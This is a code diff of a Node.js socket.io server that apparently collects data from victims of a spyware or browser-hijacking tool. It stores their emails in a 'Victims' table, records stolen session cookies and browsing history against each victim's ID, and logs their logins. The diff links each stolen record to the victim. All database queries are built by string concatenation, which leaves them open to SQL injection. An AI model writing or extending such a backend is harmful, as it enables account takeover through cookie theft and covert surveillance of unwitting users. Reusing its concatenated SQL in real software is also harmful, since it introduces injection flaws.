@@ -141,43 +141,42 @@ console.log("Listening on port 3000");
 
 io.on('connection', (socket) => {
   socket.on("userInfo", (userInfo) => {
-    var sql = "INSERT INTO Victims (email, idLogged) VALUES ('"+userInfo.email+"', '"+ userInfo.id+"')";
+    var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userInfo.email+"', '"+ userInfo.id+"')";
     con.query(sql, function (err, result) {
       console.log("1 victim added: "+userInfo.email);
     });
-
-  });
-  socket.emit('securityWebsites', [
-    // "www.google.com",
-    // "www.youtube.com"
-    "http://corndog.io/"
-  ]);
-  socket.on('Login', (loginInfo) => {
-    console.log("Login detected: " + loginInfo);
-  });
-  socket.on('Cookies', (cookies) => {
-    var sql = "INSERT INTO Cookie (userID, details) VALUES (1, '"+ cookies+"')";
-    con.query(sql, function (err, result) {
-      if (err) throw err;
+    socket.emit('securityWebsites', [
+      // "www.google.com",
+      // "www.youtube.com"
+      "http://corndog.io/"
+    ]);
+    socket.on('Login', (loginInfo) => {
+      console.log("Login detected: " + loginInfo);
     });
-  });
-  socket.on('History', (history) => {
-    var str1 = "'"+history[0]+"'" //siteLink String
-    var str2 = "'"+history[1]+"'" //timeStamp String
-
-    //INSERT INTO kevchang.History (userID, Details) VALUES (1, "secondDetails");
-    var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES (1, "+ str2 + ","+ str1+")";
-
-    con.query(sql, function (err, result) {
+    socket.on('Cookies', (cookies) => {
+      var sql = "INSERT INTO Cookie (userID, details) VALUES ('"+userInfo.id+"', '"+ cookies+"')";
+      con.query(sql, function (err, result) {
         if (err) throw err;
+      });
     });
-    //history.forEach((field) => {
-      //console.log("Field: "+typeof(field));
-      //
-      //console.log("    " + field);
-    //});
-  });
-  socket.on('disconnect', () => {
-    console.log("User disconnected");
+    socket.on('History', (history) => {
+      var str1 = "'"+history[0]+"'" //siteLink String
+      var str2 = "'"+history[1]+"'" //timeStamp String
+
+      //INSERT INTO kevchang.History (userID, Details) VALUES (1, "secondDetails");
+      var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES ('"+userInfo.id+"', "+ str2 + ","+ str1+")";
+
+      con.query(sql, function (err, result) {
+          if (err) throw err;
+      });
+      //history.forEach((field) => {
+        //console.log("Field: "+typeof(field));
+        //
+        //console.log("    " + field);
+      //});
+    });
+    socket.on('disconnect', () => {
+      console.log("User disconnected");
+    });
   });
 });
